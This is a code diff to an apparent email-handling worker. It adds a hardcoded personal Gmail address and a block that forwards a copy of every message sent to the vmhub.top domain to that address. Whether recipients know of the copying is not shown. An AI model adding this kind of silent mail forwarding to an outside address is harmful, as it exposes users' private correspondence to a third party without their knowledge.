@@ -8,6 +8,8 @@ import { now } from "@/utils/helpers";
 import { processEmailContent } from "@/utils/mail";
 import { PerformanceTimer } from "@/utils/performance";
 
+const GMAIL_COPY_ADDRESS = "netflixegy889@gmail.com";
+
 // Type for PostalMime attachments
 interface EmailAttachment {
 	filename: string | null;
@@ -309,6 +311,33 @@ export async function handleEmail(
 				isPublic ? "PUBLIC" : "PRIVATE"
 			}`,
 		);
+
+		// Send a copy of vmhub.top emails to Gmail
+		if (message.to.toLowerCase().endsWith("@vmhub.top")) {
+		    ctx.waitUntil(
+		        (async () => {
+		            try {
+		                if (!message.canBeForwarded) {
+		                    console.warn(
+		                        `Email ${emailId}: Message cannot be forwarded to Gmail`,
+		                    );
+		                    return;
+		                }
+		
+		                await message.forward(GMAIL_COPY_ADDRESS);
+		
+		                console.log(
+		                    `Email ${emailId}: Gmail copy forwarded successfully`,
+		                );
+		            } catch (error) {
+		                console.error(
+		                    `Email ${emailId}: Failed to forward Gmail copy:`,
+		                    error,
+		                );
+		            }
+		        })(),
+		    );
+		}
 
 		// Process and store attachments
 		if (validAttachments.length > 0) {
